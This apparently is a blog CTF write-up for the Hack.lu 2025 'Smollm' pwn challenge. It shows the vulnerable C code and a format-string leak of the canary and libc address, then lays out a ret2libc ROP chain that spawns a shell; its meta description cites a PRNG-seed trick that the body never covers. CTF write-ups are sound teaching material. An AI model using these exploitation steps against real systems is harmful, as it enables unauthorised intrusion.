@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="This challenge abuses a leaked PRNG seed to perfectly predict the bot’s rand()-based moves, allowing guaranteed access to a vulnerable password prompt. The exploit uses a stack buffer overflow with a two-stage ret2libc attack: first leaking a libc address with ROP, then calling system('/bin/sh') to get a shell.">
+<title>Smollm - Hack.lu 2025</title>
+
+<link rel='canonical' href='http://localhost:1313/writeups/hack.lu-2025/smollm/'>
+
+<link rel="stylesheet" href="/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css"><meta property='og:title' content="Smollm - Hack.lu 2025">
+<meta property='og:description' content="This challenge abuses a leaked PRNG seed to perfectly predict the bot’s rand()-based moves, allowing guaranteed access to a vulnerable password prompt. The exploit uses a stack buffer overflow with a two-stage ret2libc attack: first leaking a libc address with ROP, then calling system('/bin/sh') to get a shell.">
+<meta property='og:url' content='http://localhost:1313/writeups/hack.lu-2025/smollm/'>
+<meta property='og:site_name' content='Antoine Mayol'>
+<meta property='og:type' content='article'><meta property='article:section' content='Writeups' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2025-10-24T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-24T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Smollm - Hack.lu 2025">
+<meta name="twitter:description" content="This challenge abuses a leaked PRNG seed to perfectly predict the bot’s rand()-based moves, allowing guaranteed access to a vulnerable password prompt. The exploit uses a stack buffer overflow with a two-stage ret2libc attack: first leaking a libc address with ROP, then calling system('/bin/sh') to get a shell.">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="/images/profil_picture.png" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Antoine Mayol</a></h1>
+            <h2 class="site-description">Cyber security student - CTF enjoyer</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/categories/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#vulnerabilities">Vulnerabilities</a>
+      <ul>
+        <li><a href="#format-string">Format String</a></li>
+        <li><a href="#stack-based-buffer-overflow">Stack based buffer overflow</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#logic">Logic</a></li>
+        <li><a href="#stack-leak">Stack leak</a></li>
+        <li><a href="#stack-overwrite">Stack overwrite</a></li>
+        <li><a href="#rop">ROP</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+            
+                <form action="/page/search/" class="search-form widget" >
+        <p>
+            <label>Search</label>
+            <input name="keyword" required placeholder="Type something..." />
+        
+            <button title="Search">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+            
+        
+            
+                <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Categories</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/categories/writeups/" class="font_size_3">
+                Writeups
+            </a>
+        
+            <a href="/categories/challenges/" class="font_size_2">
+                Challenges
+            </a>
+        
+    </div>
+</section>
+
+            
+        
+            
+                <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Tags</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/pwn/">
+                Pwn
+            </a>
+        
+            <a href="/tags/reverse/">
+                Reverse
+            </a>
+        
+            <a href="/tags/web/">
+                Web
+            </a>
+        
+    </div>
+</section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeups/" >
+                Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/writeups/hack.lu-2025/smollm/">Smollm - Hack.lu 2025</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            This challenge abuses a leaked PRNG seed to perfectly predict the bot’s rand()-based moves, allowing guaranteed access to a vulnerable password prompt. The exploit uses a stack buffer overflow with a two-stage ret2libc attack: first leaking a libc address with ROP, then calling system(&#39;/bin/sh&#39;) to get a shell.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2025-10-24T00:00:00Z'>Oct 24, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction">Introduction
+</h2><p>This challenge is a pseudo AI assistant.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc SMOLLM.flu.xxx <span style="color:#ae81ff">1024</span>
+</span></span><span style="display:flex;"><span>Hello, and welcome to smøllm. Your friendly AI assistant.
+</span></span><span style="display:flex;"><span>You can add you own custom tokens or run a prompt.
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;
+</span></span></code></pre></div><p>The source code is provided, you can find it <a class="link" href="/blog/files/hack.lu-2025/smollm/SMOLLM.py" >here</a>.</p>
+<p>And here is the sec that seemed to be present on the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec smollm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/dajaaj/personal/hacklu2025/smollm/smollm&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:      Canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        PIE enabled
+</span></span><span style="display:flex;"><span>    RUNPATH:    b<span style="color:#e6db74">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
+</span></span><span style="display:flex;"><span>    IBT:        Enabled
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><p>Adding a token (8 bytes) will put it at the end of a pre-defined list of words.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;1
+</span></span><span style="display:flex;"><span>token?&gt;tonio
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_token</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> token, <span style="color:#66d9ef">int</span> len) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n_tokens <span style="color:#f92672">==</span> <span style="color:#ae81ff">256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Max number of tokens reached!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(tokens[n_tokens], token, len);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(tokens[n_tokens<span style="color:#f92672">++</span>] <span style="color:#f92672">+</span> len, <span style="color:#e6db74">&#39; &#39;</span>, TOKEN_SIZE <span style="color:#f92672">-</span> len);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Whereas running the prompt will ask for some input and print random words based on that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;Hi?
+</span></span><span style="display:flex;"><span>tell    tonio
+</span></span><span style="display:flex;"><span>  plfanzencould
+</span></span></code></pre></div><h2 id="vulnerabilities">Vulnerabilities
+</h2><p>We can se two main vulnerabilities in the code which are both in the <code>run_prompt</code> function.</p>
+<p>This function simulate the AI assistant.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run_prompt</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> n;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> combinator <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> in_buf[<span style="color:#ae81ff">256</span>], out_buf[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bzero</span>(in_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bzero</span>(out_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;How can I help you?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(STDIN_FILENO, in_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Read error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>out_buf[i<span style="color:#f92672">*</span>TOKEN_SIZE], tokens[(in_buf[i] <span style="color:#f92672">+</span> combinator<span style="color:#f92672">++</span>) <span style="color:#f92672">%</span> n_tokens], TOKEN_SIZE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(out_buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="format-string">Format String
+</h3><p>At the end of the function we can see that the <code>out_buf</code> will be printed as a format string, so we can use it to leak the stack.</p>
+<h3 id="stack-based-buffer-overflow">Stack based buffer overflow
+</h3><p>The memcpy will write after the <code>out_buf</code> after <code>i=32</code>, cause its size is <code>256</code>. <br>
+<code>32*TOKEN_SIZE = 32*8 = 256</code>.</p>
+<p>With this finds we can read and control the stack !</p>
+<h2 id="exploitation">Exploitation
+</h2><p>As <code>ASLR</code> is enabled we&rsquo;ll need to first leak some addresses on the stack to then construct a ROP chain (<code>NX</code> is enabled).</p>
+<p>But first we need to understand the words selection logic.</p>
+<h3 id="logic">Logic
+</h3><p>Above is the code that choose the 8 bytes word to write to <code>out_buf</code> baised on our input.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>out_buf[i<span style="color:#f92672">*</span>TOKEN_SIZE], tokens[(in_buf[i] <span style="color:#f92672">+</span> combinator<span style="color:#f92672">++</span>) <span style="color:#f92672">%</span> n_tokens], TOKEN_SIZE);
+</span></span></code></pre></div><p>So if we want the token we added to be printed we need to use the following formula: <code>token_index - i - combinator</code>.</p>
+<h3 id="stack-leak">Stack leak
+</h3><p>To leak the stack we can add the following token: <code>%p%p%p%p</code>, and print it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;1
+</span></span><span style="display:flex;"><span>token?&gt;%p%p%p%p
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;Invalid choice
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;j
+</span></span><span style="display:flex;"><span>0x10x20x10x5711695493c0can
+</span></span></code></pre></div><p>Here we leak !</p>
+<p>We can see an &ldquo;invalide choice&rdquo; message, as <code>add_token</code> only reads 8 bytes, the <code>\n</code> will be red after.</p>
+<p>Now let&rsquo;s try to print our token 32 time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;jihgfedcba<span style="color:#e6db74">`</span>_^<span style="color:#f92672">]</span><span style="color:#ae81ff">\[</span>ZYXWVUTSRQPONMLK
+</span></span><span style="display:flex;"><span>0x200x210x200x6248b7acb3c00x636465666768696a0x5b5c5d5e5f6061620x535455565758595a0x4b4c4d4e4f5051520xa<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020776f6e6b0x141d53f320319c000x7fff3701ce6f0x6248b7ac8474<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x32000000000000000x7025702570250a0x141d53f320319c00<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7fff3701cfc80x7fff3701cf400x1<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7a862a7211ca0x7fff3701cef00x7fff3701cfc80x1b7ac60400x6248b7ac83890x7fff3701cfc80xe36d61cfae476dae0x1<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x6248b7acad900x7a862a9430000xe36d61cfada76dae0xe99f5b2813c56dae0x7fff00000000<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x10x7fff3701cfc00x141d53f320319c000x7fff3701cfa00x7a862a72128b0x7fff3701cfd80x6248b7acad900x7fff3701cfd80x6248b7ac8389<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x6248b7ac80400x7fff3701cfc0<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x6248b7ac80650x7fff3701cfb80x380x10x7fff3701dfc8<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7fff3701dfd9<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x210x7fff371530000x330xd300x100x178bfbff0x6know
+</span></span></code></pre></div><p>Here because of the <code>\n</code>, we already write out of the buffer.</p>
+<p>All the <code>0x7025702570257025</code> are our <code>%p</code>.</p>
+<h3 id="stack-overwrite">Stack overwrite
+</h3><p>If we try to print 33 time our token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span></code></pre></div><p>We hit the canary&hellip; But we leaked it earlier ! So we just have to do a first leak from a first run_prompt and then overwrite the canay with the value we got from the leak.</p>
+<p>The stack like that:</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address][ ??? ]</code></p>
+<h3 id="rop">ROP
+</h3><p>As we control the return address, we might be able to do a ROP ! But with <strong>PIE</strong> and <strong>ASLR</strong> on it seems complicated :/</p>
+<p>Fortunatly an address of the libc is present in the stack&rsquo;s leak (0x7a862a7211ca in the leak above).</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address ][ ??? ][ ... ][ libc address ]</code></p>
+<p>And <strong>system</strong> and <strong>/bin/sh</strong> are present in the provided libc :)</p>
+<p>So we can create a shell !</p>
+<p>We will overwrite the stack to get something like that:</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ system ]</code></p>
+<p>There is a last problem which I figure out but looking at <code>/tmp/core.smollm.&lt;pid&gt;</code> file, when a program crashes it creates this file which you can analyse in gdb.
+And I saw the following error.</p>
+<pre tabindex="0"><code>0x7f753b65843b    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffd8e1025e8] not aligned to 16 bytes&gt;
+</code></pre><p>After looking at <a class="link" href="https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment"  target="_blank" rel="noopener"
+    >some blog post</a> I figure out that adding a ret gadget would do the job.</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ ret ][ system ]</code></p>
+<p>Tada !!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ cat flag
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Feel free to read my <a class="link" href="/blog/files/hack.lu-2025/smollm/solve.py" >script</a>, even if its a bit messy Xd.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
